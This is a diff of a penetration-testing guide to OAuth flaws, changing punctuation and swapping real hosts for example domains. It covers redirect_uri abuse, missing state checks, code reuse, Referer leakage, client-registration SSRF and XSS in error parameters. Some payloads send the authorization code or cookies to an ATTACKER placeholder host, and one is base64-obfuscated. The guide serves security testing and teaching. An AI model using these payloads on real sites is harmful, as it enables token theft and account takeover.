@@ -26,7 +26,7 @@ Target Areas on Websites
 {% endstep %}
 
 {% step %}
-Identify endpoints accepting `redirect_uri`.
+Identify endpoints accepting `redirect_uri`
 {% endstep %}
 
 {% step %}
@@ -34,10 +34,10 @@ Use a controlled domain: `redirect_uri=https://proof.example.com`
 {% endstep %}
 
 {% step %}
-Observe the HTTP 302 response and `Location` header.
+Observe the HTTP 302 response and `Location` header
 
 {% hint style="info" %}
-Malicious redirect; potential token or session theft if combined with other flaws.
+Malicious redirect; potential token or session theft if combined with other flaws
 {% endhint %}
 {% endstep %}
 {% endstepper %}
@@ -46,35 +46,19 @@ Malicious redirect; potential token or session theft if combined with other flaw
 
 {% stepper %}
 {% step %}
-Missing or weak `state` validation allows an attacker to bind a malicious authorization code to a victim’s session.
+Missing or weak `state` validation allows an attacker to bind a malicious authorization code to a victim’s session
 {% endstep %}
 
 {% step %}
-Identify `state` parameter in `/authorize`.
+Identify `state` parameter in `/authorize`
 {% endstep %}
 
 {% step %}
-Check how `state` is generated and stored.
+Check how `state` is generated and stored
 {% endstep %}
 
 {% step %}
-Send a test request and observe whether the application validates `state`.
-{% endstep %}
-{% endstepper %}
-
-***
-
-{% stepper %}
-{% step %}
-Identify SPA pages using `#access_token` or `#id_token`.
-{% endstep %}
-
-{% step %}
-Inspect outgoing links and referer headers.
-{% endstep %}
-
-{% step %}
-Ensure no real tokens are logged.
+Send a test request and observe whether the application validates `state`
 {% endstep %}
 {% endstepper %}
 
@@ -82,15 +66,31 @@ Ensure no real tokens are logged.
 
 {% stepper %}
 {% step %}
-Clients may request scopes they are not allowed; if the server does not enforce restrictions, privilege escalation is possible.
+Identify SPA pages using `#access_token` or `#id_token`
 {% endstep %}
 
 {% step %}
-Identify `scope` parameter in authorization requests.
+Inspect outgoing links and referer headers
 {% endstep %}
 
 {% step %}
-Check server-side enforcement against client-allowed scopes.
+Ensure no real tokens are logged
+{% endstep %}
+{% endstepper %}
+
+***
+
+{% stepper %}
+{% step %}
+Clients may request scopes they are not allowed; if the server does not enforce restrictions, privilege escalation is possible
+{% endstep %}
+
+{% step %}
+Identify `scope` parameter in authorization requests
+{% endstep %}
+
+{% step %}
+Check server-side enforcement against client-allowed scopes
 {% endstep %}
 {% endstepper %}
 
@@ -146,7 +146,7 @@ Log in to the Attackers Account&#x20;
 {% endstep %}
 
 {% step %}
-Turn ON the interception.
+Turn ON the interception
 {% endstep %}
 
 {% step %}
@@ -189,14 +189,12 @@ Access the victim account using the social media account
 
 {% stepper %}
 {% step %}
-
-
-Browse to a 3rd party page from the URL with sensitive data. If the Authorization Code is reflected inside the Referer header while visiting the third-party site, it can be leaked by the  attacker and reused to hijack the victim's account like this :
+Browse to a 3rd party page from the URL with sensitive data. If the Authorization Code is reflected inside the Referer header while visiting the third-party site, it can be leaked by the  attacker and reused to hijack the victim's account like this
 
 ```http
 GET / HTTP/1.1
-Host : $WEBSITE
-Referer : https://$WEBSITE/oaut-linking?code=$TOEN
+Host : example
+Referer : https://example/oaut-linking?code=$TOEN
 ```
 {% endstep %}
 {% endstepper %}
@@ -205,7 +203,7 @@ Referer : https://$WEBSITE/oaut-linking?code=$TOEN
 
 {% stepper %}
 {% step %}
-Check if you can reuse the Authorization Code after a few time later In case of Authorization Code leakage, the attacker could reuse it to exchange it for Access Token and hijack the victim's account.
+Check if you can reuse the Authorization Code after a few time later In case of Authorization Code leakage, the attacker could reuse it to exchange it for Access Token and hijack the victim's account
 {% endstep %}
 
 {% step %}
@@ -219,7 +217,7 @@ Complete the OAuth Flow again , but replace the authorization code with the one 
 {% step %}
 Ensure that the OAuth process fails&#x20;
 
-If Authorization Code is exchanged for an Access Token, invalidate the Authorization Code and not issue any more Access Token against it. For the [JWT tokens](https://auth0.com/docs/secure/tokens/access-tokens#jwt-access-tokens) use the Refresh Token mechanism to extend it.
+If Authorization Code is exchanged for an Access Token, invalidate the Authorization Code and not issue any more Access Token against it. For the [JWT tokens](https://auth0.com/docs/secure/tokens/access-tokens#jwt-access-tokens) use the Refresh Token mechanism to extend it
 {% endstep %}
 {% endstepper %}
 
@@ -238,8 +236,7 @@ Initiate the OAuth process
 Send the request with the redirect\_uri parameter to the repeater
 
 ```http
-EXAMPLE OF A REQUEST:
-GET /OAuth/auth?client_id=asd&redirect_uri=https://target.com&response_type=code HTTP/1.1
+GET /OAuth/auth?client_id=asd&redirect_uri=https://example.com&response_type=code HTTP/1.1
 Host: afine.com
 ```
 {% endstep %}
@@ -248,15 +245,15 @@ Host: afine.com
 Detect the Open Redirect vulnerability Simple Open Redirect - replace the redirect\_uri parameter with the domain under your control
 
 ```http
-GET /OAuth/auth?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
+GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com HTTP/1.1
 Host: afine.com
 ```
 {% endstep %}
 
 {% step %}
-SECOND ORDER SSRF - start the HTTP Listener on ports 80 & 443 and repeat the SIMPLE OPEN REDIRECT.
+SECOND ORDER SSRF - start the HTTP Listener on ports 80 & 443 and repeat the SIMPLE OPEN REDIRECT
 
-* Check the collaborator if you get the HTTP interaction, for example:&#x20;
+* Check the collaborator if you get the HTTP interaction, for example
 
 ```http
 GET /OAuth/auth-callback?code=0SwG-3tuLQ9y8GNv2lNYt0mzBTPLKxtzLdw HTTP/1.1
@@ -269,46 +266,46 @@ PATH BYPASS - manipulate path to access the same endpoint in different ways, tog
 
 ```http
 EXAMPLES OF A REQUEST:
-GET /OAuth/////?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
-GET /OAuth/./././?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
-GET /OAuth/./../auth?client_id=1234&redirect_uri=https://afine.com HTTP/1.1
+GET /OAuth/////?client_id=1234&redirect_uri=https://example.com HTTP/1.1
+GET /OAuth/./././?client_id=1234&redirect_uri=https://example.com HTTP/1.1
+GET /OAuth/./../auth?client_id=1234&redirect_uri=https://example.com HTTP/1.1
 ```
 {% endstep %}
 
 {% step %}
-PARAMETER POLLUTION - reuse the redirect\_uri parameter.
+PARAMETER POLLUTION - reuse the redirect\_uri parameter
 
 ```http
 EXAMPLES OF A REQUEST:
-GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com&redirect_uri=https://afine.com HTTP/1.1
+GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com&redirect_uri=https://example.com HTTP/1.1
 ```
 {% endstep %}
 
 {% step %}
-REFERER BASED REDIRECTION - host the below script on your server, visit it, then use SSO.
+REFERER BASED REDIRECTION - host the below script on your server, visit it, then use SSO
 
 ```html
-<html><a href="https://TARGET/login">click on this link</a></html>
+<html><a href="https://example/login">click on this link</a></html>
 ```
 {% endstep %}
 
 {% step %}
-&#x20; FUZZING OPEN REDIRECTION & SECOND ORDER SSRF Generate a payload list using crimson\_redirector.
+&#x20; FUZZING OPEN REDIRECTION & SECOND ORDER SSRF Generate a payload list using crimson\_redirector
 
 * USAGE: crimson\_redirector.py whitelisted\_domain domain\_collab vps\_ip redirect\_parameter\_name
 * EXAMPLE: crimson\_redirector.py whitelisted.com col.afine.com 123.123.123.123 redirect\_uri
 {% endstep %}
 
 {% step %}
-Start the HTTP Listener on the VPS server.
+Start the HTTP Listener on the VPS server
 {% endstep %}
 
 {% step %}
-Start the fuzzing the parameter value using Burp Suite.
+Start the fuzzing the parameter value using Burp Suite
 {% endstep %}
 
 {% step %}
-Check the output of the Intruder for any suspicious responses.
+Check the output of the Intruder for any suspicious responses
 {% endstep %}
 {% endstepper %}
 
@@ -316,11 +313,11 @@ Check the output of the Intruder for any suspicious responses.
 
 {% stepper %}
 {% step %}
-Redirect flow to the static endpoint on the same domain to break it.
+Redirect flow to the static endpoint on the same domain to break it
 {% endstep %}
 
 {% step %}
-The attacker could use the static endpoint within the application to break the execution flow. Then, prevent the application from consuming the single-use Authorization Code.Then, chain it with an XSS vulnerability found in any endpoint across the application to leak the Authorization Code.
+The attacker could use the static endpoint within the application to break the execution flow. Then, prevent the application from consuming the single-use Authorization Code.Then, chain it with an XSS vulnerability found in any endpoint across the application to leak the Authorization Code
 {% endstep %}
 
 {% step %}
@@ -328,28 +325,27 @@ Identify that the application allows redirecting the user to other paths on the 
 {% endstep %}
 
 {% step %}
-Try exploiting the XSS vulnerability on one of these endpoints.
+Try exploiting the XSS vulnerability on one of these endpoints
 {% endstep %}
 
 {% step %}
 If it does not work, search for a static endpoint (401.html) which should break the OAuth flow
 
 ```http
-EXAMPLE OF A REQUEST:
 GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/401.html HTTP/1.1
 ```
 {% endstep %}
 
 {% step %}
-Use the XSS on the other endpoint with the below content, to break the flow and leak the access key:
+Use the XSS on the other endpoint with the below content, to break the flow and leak the access key
 
 ```javascript
-javascript:x=window.open("https://TARGET/callback?redirectUrl=https://TARGET/401.html");setTimeout(function() {document.location="http://ATTACKER/?c="+x.location;},5000);
+javascript:x=window.open("https://example.com/callback?redirectUrl=https://TARGET/401.html");setTimeout(function() {document.location="http://ATTACKER/?c="+x.location;},5000);
 ```
 {% endstep %}
 
 {% step %}
-Example of an XSS payload to exploit the issue: (Credits to [Dawid](https://github.com/mackeysec) from [AFINE](https://afine.pl/) for finding this)
+Example of an XSS payload to exploit the issue (Credits to [Dawid](https://github.com/mackeysec) from [AFINE](https://afine.pl/) for finding this)
 
 ```javascript
 <img src=x onerror=location=atob`amF2YXNjcmlwdDp4PXdpbmRvdy5vcGVuKCJodHRwczovL1RBUkdFVC9jYWxsYmFjaz9yZWRpcmVjdFVybD1odHRwczovL1RBUkdFVC80MDEuaHRtbCIpO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL0FUVEFDS0VSLz9jPScreC5sb2NhdGlvbjt9LDUwMDApOw==`>
@@ -357,9 +353,7 @@ Example of an XSS payload to exploit the issue: (Credits to [Dawid](https://gith
 {% endstep %}
 
 {% step %}
-Require client applications to register a whitelist of valid <sub>redirect\_uris</sub>. Use strict byte-to-byte comparison to validate the URI. Allow complete and exact matches.
-
-
+Require client applications to register a whitelist of valid <sub>redirect\_uris</sub>. Use strict byte-to-byte comparison to validate the URI. Allow complete and exact matches
 {% endstep %}
 {% endstepper %}
 
@@ -367,23 +361,22 @@ Require client applications to register a whitelist of valid <sub>redirect\_uris
 
 {% stepper %}
 {% step %}
-Redirect flow to the endpoint on the same domain using path traversal. The attacker could use the vulnerability on the other endpoint within the application and the new path as a proxy page to steal a victim's Access Token, thus hijacking his account.
+Redirect flow to the endpoint on the same domain using path traversal. The attacker could use the vulnerability on the other endpoint within the application and the new path as a proxy page to steal a victim's Access Token, thus hijacking his account
 {% endstep %}
 
 {% step %}
-Turn ON the interception.
+Turn ON the interception
 {% endstep %}
 
 {% step %}
-Initiate the OAuth process.
+Initiate the OAuth process
 {% endstep %}
 
 {% step %}
-Send the request with the <sub>redirect\_uri</sub> parameter to the repeater.
+Send the request with the <sub>redirect\_uri</sub> parameter to the repeater
 
 ```http
-EXAMPLE OF A REQUEST:
-GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback HTTP/1.1
+GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com/callback HTTP/1.1
 Host: afine.com
 ```
 {% endstep %}
@@ -392,15 +385,12 @@ Host: afine.com
 Change the path using PATH TRAVERSAL to redirect the flow to another endpoint
 
 ```http
-EXAMPLE OF A REQUEST:
-GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback/../vuln HTTP/1.1
+GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com/callback/../vuln HTTP/1.1
 ```
 {% endstep %}
 
 {% step %}
-If it is possible to redirect the user to another endpoint (/vuln), there is a vulnerability FUZZING PATH TRAVERSAL Check the other PATH TRAVERSAL bypasses using the TRAVERSAL\_DIR\_ONLY wordlist.
-
-
+If it is possible to redirect the user to another endpoint (/vuln), there is a vulnerability FUZZING PATH TRAVERSAL Check the other <sub>PATH TRAVERSAL</sub> bypasses using the <sub>TRAVERSAL\_DIR\_ONLY</sub> wordlist
 {% endstep %}
 {% endstepper %}
 
@@ -412,42 +402,42 @@ Check if it is possible to register your client application. Discover the OpenID
 {% endstep %}
 
 {% step %}
-Fuzz the POST body to find proper parameters - a good start is to use just:
+Fuzz the POST body to find proper parameters - a good start is to use just
 
 ```json
-EXAMPLE OF A VALID POST REQUEST:
 POST /client_register HTTP/1.1
-Host: oauth.afine.com
+Host: oauth.example.com
 Content-Type: application/json
 
-{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
+{"redirect_uris": ["https://whitelist.com/callback"]}
 ```
 {% endstep %}
 
 {% step %}
-If you get the 200 OK response with a <sub>CLIENT\_ID</sub> in the body, it is likely vulnerable.&#x20;
+If you get the 200 OK response with a <sub>CLIENT\_ID</sub> in the body, it is likely vulnerable
 
-> The OpenID provider should require the client application to authenticate itself. For instance, use an HTTP bearer token.
+> The OpenID provider should require the client application to authenticate itself. For instance, use an HTTP bearer token
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### OpenID Dynamic Registration SSRF
+
 {% stepper %}
 {% step %}
-Find the OpenID registration endpoint and check for SSRF.&#x20;
+Find the OpenID registration endpoint and check for SSRF
 
 ```json
-EXAMPLE OF A VALID POST REQUEST:
 POST /client_register HTTP/1.1
-Host: oauth.afine.com
+Host: oauth.example.com
 Content-Type: application/json
-{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
+{"redirect_uris": ["https://whitelisted.com/callback"]}
 ```
 {% endstep %}
 
 {% step %}
-Use a private collaborator in place of the WHITELISTED.COM domain to check for SSRF vulnerability.&#x20;
+Use a private collaborator in place of the WHITELISTED.COM domain to check for SSRF vulnerability
 {% endstep %}
 
 {% step %}
@@ -455,15 +445,15 @@ Fuzz the POST body to discover more URI parameters (see the PortSwigger example 
 {% endstep %}
 
 {% step %}
-Fuzz the URI parameters values using SSRF wordlist and the one generated with crimson\_redirector.py.
+Fuzz the URI parameters values using SSRF wordlist and the one generated with crimson\_redirector.py
 {% endstep %}
 
 {% step %}
-After discovering <sub>UNVERIFIED CLIENT REGISTRATION</sub>, inject domain collaborator in every URI-like parameter value.
+After discovering <sub>UNVERIFIED CLIENT REGISTRATION</sub>, inject domain collaborator in every URI-like parameter value
 
 ```http
 POST /client_register HTTP/1.1
-Host: target
+Host: example
 Content-Type: application/json
 {
   "redirect_uris": ["https://TARGET/callback"],
@@ -474,30 +464,27 @@ Content-Type: application/json
 {% endstep %}
 
 {% step %}
-Find a way to trigger the server somehow to use these URLs.
+Find a way to trigger the server somehow to use these URLs
 {% endstep %}
 
 {% step %}
-One way is to use the <sub>CLIENT\_ID</sub> parameter value from the server response after registering the client.
+One way is to use the <sub>CLIENT\_ID</sub> parameter value from the server response after registering the client
 {% endstep %}
 
 {% step %}
-Find the endpoint that fetches the logo (it should be one of the endpoints used during OAuth flow).
+Find the endpoint that fetches the logo (it should be one of the endpoints used during OAuth flow)
 {% endstep %}
 
 {% step %}
-Use the <sub>CLIENT\_ID</sub> to trigger the server interaction.
+Use the <sub>CLIENT\_ID</sub> to trigger the server interaction
 
 ```http
-EXAMPLE REQUEST:
 GET /client/CLIENT_ID/logo HTTP/1.1
 ```
 {% endstep %}
 
 {% step %}
 Observe the <sub>DNS/HTTP</sub> out-of-bound interactions in your collaborator server
-
-
 {% endstep %}
 {% endstepper %}
 
@@ -592,32 +579,32 @@ OAuth Parameters
 
 {% stepper %}
 {% step %}
-The attacker takes control of the homograph/IDN domain (for example, a domain that looks like oauth.semrush.com).
+The attacker takes control of the homograph/IDN domain (for example, a domain that looks like oauth.semrush.com)
 {% endstep %}
 
 {% step %}
-The attacker creates an authorize address whose redirect\_uri parameter points to this domain (with Unicode characters).
+The attacker creates an authorize address whose redirect\_uri parameter points to this domain (with Unicode characters)
 {% endstep %}
 
 {% step %}
-The user logs in and authorizes (or if already authorized, the process appears without interaction).
+The user logs in and authorizes (or if already authorized, the process appears without interaction)
 {% endstep %}
 
 {% step %}
-The SEMrush server mistakenly considers the redirect\_uri to be valid and sends the authorization code to the attacker's domain (the browser converts it to a paniccode).
+The SEMrush server mistakenly considers the redirect\_uri to be valid and sends the authorization code to the attacker's domain (the browser converts it to a paniccode)
 {% endstep %}
 
 {% step %}
-The attacker takes the code and converts it into an access token and gains access to the user's information/operations.
+The attacker takes the code and converts it into an access token and gains access to the user's information/operations
 
 for example request
 
 ```
-https://oauth.semrush.com/oauth2/authorize?
+https://oauth.example.com/oauth2/authorize?
 response_type=code&
 scope=user.info,projects.info,siteaudit.info&
 client_id=seoquake&
-redirect_uri=https://oauth.semrush.com/oauth2/success
+redirect_uri=https://oauth.example.com/oauth2/success
 ```
 {% endstep %}
 
@@ -658,7 +645,7 @@ We do a part of the process wrongly to see the error parameter in the requests\
 Like this request
 
 ```url
-Full url:https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
+Full url:https://auth2.example.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
 ```
 {% endstep %}
 
@@ -674,7 +661,7 @@ If we see one of these parameters in the requests, we will inject this XSS code
 for example
 
 ```javascript
-https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
+https://auth2.example.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
 ```
 {% endstep %}
 {% endstepper %}
